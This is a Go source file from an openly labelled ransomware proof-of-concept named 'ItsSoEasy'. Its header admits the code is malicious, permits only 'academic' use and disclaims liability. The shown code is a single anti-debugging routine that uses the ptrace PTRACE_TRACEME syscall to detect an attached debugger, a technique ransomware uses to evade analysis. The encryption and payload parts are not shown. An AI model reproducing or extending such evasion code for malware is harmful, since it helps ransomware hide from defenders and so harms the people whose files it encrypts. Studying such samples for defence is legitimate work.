/*
ItsSoEasy -- Crypto-Ransomware Proof-of-Concept

''' ransomware version (Go) '''

What?
This is a Ransomware Concept written in Go. Yes it is malicious. Yes, if you do that on VMs it is okay. Yes,
if you misconfigured the architecture or network and encrypt your own files they are gone forever.

Copyright (c) 2021/2022 Bastian Buck
Contact: https://github.com/bstnbuck

Attention! Use of the code samples and proof-of-concepts shown here is permitted solely at your own risk for academic
        and non-malicious purposes. It is the end user's responsibility to comply with all applicable local, state,
		and federal laws. The developer assumes no liability and is not responsible for any misuse or damage caused by this
        tool and the software in general.
*/

package main

import "syscall"

func debuggerPresent() bool {
	// https://stackoverflow.com/questions/58572777/how-to-detect-if-ptrace-already-called-in-golang-linux
	// https://pkg.go.dev/syscall#PtraceAttach
	// on linux only make a system call to ptrace to get debugger presence
	_, _, res := syscall.RawSyscall(syscall.SYS_PTRACE, uintptr(syscall.PTRACE_TRACEME), 0, 0)

	if res == 1 {
		return true
	}
	return false
}
